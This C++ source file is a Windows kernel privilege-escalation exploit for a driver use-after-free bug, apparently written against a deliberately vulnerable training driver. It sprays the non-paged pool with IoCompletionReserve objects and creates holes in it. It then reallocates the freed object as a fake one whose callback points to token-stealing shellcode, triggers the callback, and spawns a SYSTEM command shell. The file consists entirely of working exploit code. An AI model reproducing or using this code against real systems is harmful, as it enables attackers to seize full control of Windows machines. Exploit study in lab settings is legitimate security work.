#include <Windows.h>
#include "winternl.h"
#include "stdio.h"

#include "Solutions.h"
#include "ioctal_codes.h"
#include "TokenStealingShellcode.h"

enum class Commands {
	AllocateUAFObject,
	FreeUAFObject,
	AllocateFakeObject,
	UseUafObject
};

typedef struct UAFStruct {
	INT callback;
	CHAR buf[0x54];
} UAFStruct;

typedef NTSTATUS(WINAPI* NtAllocateReserveObject_t) (
	OUT PHANDLE hObject,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN DWORD ObjectType);

NTSTATUS Command(HANDLE deviceHandle, Commands operate);
NTSTATUS SprayHeap();
DWORD getIoctl(Commands operate);

DWORD Solutions::TriggerUAF() {
	
	// allocate 
	// free
	// allocate fake object
	// overwrite callback
	// use
	NTSTATUS res = SprayHeap();
	if (!NT_SUCCESS(res)) {
		return res;
	}

	if (!NT_SUCCESS(Command(_hDeviceHandle, Commands::AllocateUAFObject))) {
		wprintf(L"[-] Could not allocate UAF object");
		return STATUS_INVALID_PARAMETER;
	}
	wprintf(L"[+] Allocated UAF object\n");

	if (!NT_SUCCESS(Command(_hDeviceHandle, Commands::FreeUAFObject))) {
		wprintf(L"[-] Could not free UAF object");
		return STATUS_INVALID_PARAMETER;
	}
	wprintf(L"[+] Freed UAF object\n");

	DWORD dwBytesReturned = 0;
	UAFStruct* lpInBuffer = (UAFStruct*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(UAFStruct));
	if (!lpInBuffer) {
		wprintf(L"[-] Could not allocate buffer\n");
		return STATUS_NO_MEMORY;
	}

	lpInBuffer->callback = (ULONG)&tokenStealingShellcodeWriteWhatWhere;
	memset(lpInBuffer->buf, 0x41, 0x54);
	wprintf(L"[+] token stealing shellcode 0x%x\n", (ULONG)&tokenStealingShellcodeWriteWhatWhere);
	
	if (!DeviceIoControl(_hDeviceHandle, IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED,
		(PVOID)lpInBuffer, sizeof(UAFStruct), NULL, NULL, &dwBytesReturned, NULL)) {
		wprintf(L"[-] Could not talk with the driver\n");
		return STATUS_INVALID_PARAMETER;
	}
	wprintf(L"[+] Allocated fake object\n");
	
	if (!NT_SUCCESS(Command(_hDeviceHandle, Commands::UseUafObject))) {
		wprintf(L"[-] Could not use UAF object");
		return STATUS_INVALID_PARAMETER;
	}
	wprintf(L"[+] Calling UAF callback -- enjoy system :)\n");

	system("cmd.exe");

	return 0;
}

NTSTATUS Command(HANDLE deviceHandle, Commands operate) {
	
	DWORD dwBytesReturned = 0;
	return
		DeviceIoControl(deviceHandle,
			getIoctl(operate),
			NULL,
			NULL,
			NULL,
			NULL,
			&dwBytesReturned,
			NULL
		);
}

static NTSTATUS SprayHeap() {
	const DWORD hArrSize = 8000 + 5000;
	auto NtAllocateReserveObject = (NtAllocateReserveObject_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"),
																				"NtAllocateReserveObject");
	
	if (!NtAllocateReserveObject) {
		wprintf(L"[-] Could not load NtAllocateResearveObject - %d\n", GetLastError());
		return STATUS_DLL_NOT_FOUND;
	}

	NTSTATUS status = 0;
	PHANDLE hIoCo = (PHANDLE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, hArrSize * sizeof(HANDLE));
	if (!hIoCo) {
		wprintf(L"[-] Could not allocate buffer\n");
		return STATUS_NO_MEMORY;
	}

	wprintf(L"[+] Spraying non paged pool with IoCo objects\n");
	for (int i = 0; i < 8000 + 5000; i++) {
		status = NtAllocateReserveObject(&hIoCo[i], NULL, 1); // 1 = IoCo - > IoCompletionReserve 
		if (!NT_SUCCESS(status)) {
			wprintf(L"[-] Could not allocate IoCo object - %d\n", GetLastError());
			return STATUS_NO_MEMORY;
		}
	}

	wprintf(L"[+] Creating holes in the pool\n");
	BOOLEAN shouldFree = true;
	for (int i = 8000; i < 13000; i++) {
		shouldFree && CloseHandle(hIoCo[i]);
		shouldFree = !shouldFree;
	}

	return 0; // STATUS_SUCCESS
}

DWORD getIoctl(Commands operate) {
	switch (operate) {
	case Commands::AllocateUAFObject:
		return IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED;
	case Commands::FreeUAFObject:
		return IOCTL_FREE_UAF_NON_PAGED;
	case Commands::UseUafObject:
		return IOCTL_USE_UAF_NON_PAGED;
	}

	return STATUS_INVALID_PARAMETER;
}